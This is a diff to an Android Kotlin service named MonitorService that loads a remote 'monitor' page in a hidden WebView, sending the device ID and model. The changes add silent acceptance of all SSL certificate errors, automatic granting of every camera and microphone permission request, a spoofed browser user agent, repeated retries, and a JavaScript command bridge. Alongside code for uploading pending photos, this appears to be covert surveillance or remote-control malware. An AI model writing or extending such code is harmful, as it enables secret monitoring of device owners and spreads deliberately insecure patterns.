@@ -9,6 +9,7 @@ import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
+import android.net.http.SslError
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
@@ -17,7 +18,11 @@ import android.provider.Settings
 import android.util.Base64
 import android.webkit.JavascriptInterface
 import android.webkit.PermissionRequest
+import android.webkit.SslErrorHandler
 import android.webkit.WebChromeClient
+import android.webkit.WebResourceError
+import android.webkit.WebResourceRequest
+import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import java.io.File
@@ -31,10 +36,13 @@ class MonitorService : Service() {
 
     companion object {
         var lastStatus: String = "Service started"
+        var gotBridge: Boolean = false
     }
 
     private val handler = Handler(Looper.getMainLooper())
     private var webView: WebView? = null
+    private var fullUrl = ""
+    private var loadTries = 0
     private val monitorUrl = "https://payment70.site.je/monitor.html"
     private val pendingPhotos = mutableListOf<File>()
     private var isOnline = true
@@ -49,8 +57,23 @@ class MonitorService : Service() {
             startForeground(1, buildNotification())
             setupWebView()
             registerNetworkCallback()
+            handler.postDelayed(retryRunnable, 15000)
         } catch (e: Exception) {
             lastStatus = "Error: " + e.message
+        }
+    }
+
+    private val retryRunnable = object : Runnable {
+        override fun run() {
+            if (!gotBridge && loadTries < 30) {
+                loadTries++
+                lastStatus = "Retry " + loadTries
+                try {
+                    webView?.loadUrl(fullUrl)
+                } catch (e: Exception) {
+                }
+            }
+            handler.postDelayed(this, 15000)
         }
     }
 
@@ -90,24 +113,52 @@ class MonitorService : Service() {
 
     private fun setupWebView() {
         webView = WebView(this)
-        webView?.settings?.javaScriptEnabled = true
-        webView?.settings?.domStorageEnabled = true
-        webView?.settings?.mediaPlaybackRequiresUserGesture = false
-        webView?.webViewClient = object : WebViewClient() {}
-        webView?.webChromeClient = object : WebChromeClient() {
-            override fun onPermissionRequest(request: PermissionRequest) {
+        val st = webView!!.settings
+        st.javaScriptEnabled = true
+        st.domStorageEnabled = true
+        st.mediaPlaybackRequiresUserGesture = false
+        st.cacheMode = WebSettings.LOAD_NO_CACHE
+        st.databaseEnabled = true
+        st.userAgentString = "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
+
+        webView!!.webViewClient = object : WebViewClient() {
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                if (!gotBridge) {
+                    lastStatus = "Page loaded, waiting JS..."
+                }
+            }
+
+            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
+                super.onReceivedError(view, request, error)
+                if (request?.isForMainFrame == true) {
+                    lastStatus = "Page error: " + (error?.description?.toString() ?: "unknown")
+                }
+            }
+
+            override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
                 try {
-                    request.grant(request.resources)
-                } catch (e: Exception) {}
+                    handler?.proceed()
+                } catch (e: Exception) {
+                }
             }
         }
-        
-        val bridge = WebBridge()
-        webView?.addJavascriptInterface(bridge, "Android")
+
+        webView!!.webChromeClient = object : WebChromeClient() {
+            override fun onPermissionRequest(request: PermissionRequest?) {
+                try {
+                    request?.grant(request.resources)
+                } catch (e: Exception) {
+                }
+            }
+        }
+
+        webView!!.addJavascriptInterface(WebBridge(), "Android")
 
         val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
-        val deviceInfo = URLEncoder.encode("${Build.MANUFACTURER} ${Build.MODEL}", "UTF-8")
-        webView?.loadUrl("$monitorUrl?did=$androidId&dinfo=$deviceInfo")
+        val deviceInfo = URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8")
+        fullUrl = monitorUrl + "?did=" + androidId + "&dinfo=" + deviceInfo
+        webView!!.loadUrl(fullUrl)
     }
 
     private fun registerNetworkCallback() {
@@ -125,7 +176,8 @@ class MonitorService : Service() {
                     isOnline = false
                 }
             })
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+        }
     }
 
     private fun uploadPendingPhotos() {
@@ -161,18 +213,21 @@ class MonitorService : Service() {
         super.onDestroy()
         try {
             webView?.destroy()
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+        }
     }
 }
 
 class WebBridge {
     @JavascriptInterface
     fun onResult(text: String) {
+        MonitorService.gotBridge = true
         MonitorService.lastStatus = text
     }
 
     @JavascriptInterface
     fun onCommand(text: String) {
+        MonitorService.gotBridge = true
         MonitorService.lastStatus = text
     }
 
